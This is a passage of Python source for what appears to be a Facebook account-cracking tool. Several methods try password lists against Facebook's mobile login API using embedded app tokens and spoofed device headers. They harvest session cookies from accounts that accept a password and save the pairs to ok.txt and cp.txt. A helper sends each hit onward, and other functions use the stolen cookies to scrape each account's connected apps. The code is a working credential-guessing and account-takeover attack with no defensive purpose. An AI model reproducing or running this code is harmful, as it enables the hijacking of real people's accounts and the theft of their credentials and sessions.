        prints(tree)

    def ApkAktif(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    self.ak.append(f"[bold green]{str(apk.text).replace('Ditambahkan','[while] - Ditambahkan')}")
                else:continue
            self.ApkAktif(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def ApkKadal(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    self.ka.append(f"[bold red]{str(apk.text).replace('Kedaluwarsa','[while] - Kedaluwarsa')}")
                else:continue
            self.ApkKadal(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def apiiiiii(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_api()
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:
                        self.cek_apk(username, password, coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[[bold green]LIVE[/]] {username}|{password}")
                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                        prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    tree = Tree("")
                    tree.add(f"[[bold yellow]CHEK[/]] {username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

    def apiiiiii2(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.dalvik()
                data = {"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "cpl": "true", "source": "login", "format": "json","credentials_type": "password","error_detail_type": "button_with_disabled", "generate_analytics_claim": "1","generate_machine_id": "1", "tier": "regular", "sdk": "android", "generate_session_cookies": "1", "api_key": "882a8490361da98702bf97a021ddc14d", "sig": "62f8ce9f74b12f84c123cc23437a4a32", "fb_api_req_friendly_name": "authenticate", "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",  }
                head = {"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", "Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "mobile.CTRadioAccessTechnologyLTE", "x-fb-net-sid": "", "x-tigon-is-retry": "False", "x-fb-friendly-name": "authenticate", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://b-graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:
                        self.cek_apk(username, password, coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[[bold green]LIVE[/]] {username}|{password}")
                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                        prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    tree = Tree("")
                    tree.add(f"[[bold yellow] CHECK[/]] {username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1


    def regguler(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.dalvik()
                adid = uuid.uuid4()
                device_id = uuid.uuid4()
                family_device_id = uuid.uuid4()
                data = {'adid': adid,'format': 'json', 'device_id': device_id,'generate_analytics_claims': '1','community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': family_device_id, 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_machine_id': '1','currently_logged_in_userid': '0', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': 'fc0a7caa49b192f64f6f5a6d9643bb28', "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": {random.randint(1,26)}, "email": username, "locale": "en_US", "password": password, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", 'X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                xnxx = ses.post("https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:
                        self.cek_apk(username, password, coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[[bold green]LIVE[/]] {username}|{password}")
                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                        prints(tree)
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    tree = Tree("")
                    tree.add(f"[[bold yellow]CHEK[/]] {username}|{password}")
                    prints(tree)
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

Login()
